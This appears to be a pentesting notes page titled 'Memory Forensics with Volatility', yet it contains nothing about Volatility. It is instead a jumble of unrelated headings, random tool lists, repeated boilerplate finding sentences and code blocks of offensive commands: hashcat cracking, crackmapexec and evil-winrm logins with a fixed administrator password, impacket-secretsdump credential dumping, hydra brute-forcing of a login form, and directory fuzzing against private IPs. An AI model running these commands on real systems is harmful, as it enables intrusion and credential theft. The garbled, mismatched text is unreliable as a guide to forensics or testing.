---
TitleSEO: "Memory Forensics with Volatility | ZureFX"
TitlePost: "Memory Forensics with Volatility"
Author: "ZureFX"
Description: "Personal notes on Memory Forensics with Volatility. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, lateral movement, dfir"
URL: "https://zurefx.github.io/notes/note-memory-forensics-with-volatility-882.html"
URL_IMAGES: ""
Date: "2025-11-12"
Tags: "Enumeration, Lateral Movement, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-memory-forensics-with-volatility-882"
Permalink: "/notes/note-memory-forensics-with-volatility-882.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PostgreSQL

### Node.js

- `wpscan`
- `GetNPUsers`
- `impacket`
- `ldapsearch`
- `Pass the Hash`
- `kerbrute`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.62.198.82 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

- `crackmapexec`
- `Golden Ticket`
- `XXE`
- `netcat`
- `SSTI`

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

## RPC

### Unconstrained Delegation

```bash
gobuster dir -u http://10.67.222.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

- `Golden Ticket`
- `netcat`
- `Pass the Ticket`
- `DLL Hijacking`

- `SeImpersonatePrivilege`
- `secretsdump`
- `Subdomain Takeover`

## bloodhound

### Drupal

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.246.82
gobuster dir -u http://10.30.132.72/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```python
gobuster dir -u http://10.82.247.113/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.243.2
gobuster dir -u http://10.128.52.153/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Docker Escape

### POP3

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.124.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.47.175.183 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.92.172.109/FUZZ
```
